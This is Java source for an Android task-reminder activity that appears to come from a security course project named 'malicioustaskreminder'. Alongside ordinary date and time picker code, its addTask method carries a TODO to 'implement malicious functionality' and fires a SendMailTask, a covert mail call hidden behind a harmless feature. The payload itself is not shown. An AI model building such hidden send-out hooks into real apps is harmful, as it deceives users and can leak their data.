package edu.cmu.malicioustaskreminder;

import java.util.Calendar;

import android.os.Bundle;
import android.app.Activity;
import android.app.DialogFragment;
import android.util.Log;
import android.view.View;
import android.widget.TextView;

public class TaskDetails extends Activity implements OnTimeSelectedListener, OnDateSelectedListener {

	private TextView dateDisplay;
	private TextView fromTimeDisplay;
	private TextView toTimeDisplay;
	private DialogFragment taskDateFragment = new DatePickerFragment();
	private DialogFragment timeFragment = new TimePickerFragment();
	
	private int year;
	private int month;
	private int day;
	
	private int fromHour;
	private int fromMinute;
	private int toHour;
	private int toMinute;
	
	private static String typeOfTag = null;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.task_details);
		initializeFromTime();
		initializeToTime();
		initializeCurrentDate();
	}

	private void initializeCurrentDate() {
		final Calendar c = Calendar.getInstance();
		year = c.get(Calendar.YEAR);
		month = c.get(Calendar.MONTH);
		day = c.get(Calendar.DAY_OF_MONTH);
		
		dateDisplay = (TextView) findViewById(R.id.taskDate);
		dateDisplay.setText(new StringBuilder()
		// Month is 0 based, just add 1
		.append(month + 1).append("-").append(day).append("-")
		.append(year).append(" "));
		
	}

	private void initializeToTime() {
		final Calendar c = Calendar.getInstance();
		toHour = c.get(Calendar.HOUR_OF_DAY);
		toMinute = c.get(Calendar.MINUTE);	
		toTimeDisplay = (TextView)findViewById(R.id.toTime);
		toTimeDisplay.setText(new StringBuilder().append(toHour).append(":").append(toMinute));	
	}

	private void initializeFromTime() {
		final Calendar c = Calendar.getInstance();
		fromHour = c.get(Calendar.HOUR_OF_DAY);
		fromMinute = c.get(Calendar.MINUTE);	
		fromTimeDisplay = (TextView)findViewById(R.id.fromTime);
		fromTimeDisplay.setText(new StringBuilder().append(fromHour).append(":").append(fromMinute));	
	}
	
	public void inputTaskDate(View v) {
		taskDateFragment.show(getFragmentManager(), "datePicker");
	}
	
	public void inputFromTime(View v) {
		typeOfTag = "from";
		timeFragment.show(getFragmentManager(), "fromTimePicker");
	}
	
	public void inputToTime(View v) {
		typeOfTag = "to";
		timeFragment.show(getFragmentManager(), "toTimePicker");
	}
	
	public void onTimeSet(int hour, int minute) {
		StringBuilder timeString = new StringBuilder();
		
		if(typeOfTag.equalsIgnoreCase("to")) {
			toHour = hour;
			toMinute = minute;
			toTimeDisplay = (TextView)findViewById(R.id.toTime);
			timeString.append((hour<10)? "0"+hour : hour).append(":");
			timeString.append((minute<10)? "0"+minute : minute);
			toTimeDisplay.setText(timeString);	
		} else if(typeOfTag.equalsIgnoreCase("from")) {
			fromHour = hour;
			fromMinute = minute;
			fromTimeDisplay = (TextView)findViewById(R.id.fromTime);
			timeString.append((hour<10)? "0"+hour : hour).append(":");
			timeString.append((minute<10)? "0"+minute : minute);
			fromTimeDisplay.setText(timeString);	}
	}
	
	public void onDateSet(int year, int monthOfYear,int dayOfMonth) {
			this.year = year;
			month = monthOfYear;
			day = dayOfMonth;
			
			StringBuilder dateString = new StringBuilder();
			dateDisplay = (TextView) findViewById(R.id.taskDate);
			
			dateString.append((month<10)? "0"+(month+1) : (month+1)).append("-");
			dateString.append((day<10)? "0"+day : day).append("-");
			dateString.append(year);
			dateDisplay.setText(dateString);
	}
	
	public void addTask(View v) {
		Log.d("asdf", "asdf");
		//TODO: write the add task function, and implement malicious functionality in it
		new SendMailTask().execute((Object)null);
	}

}
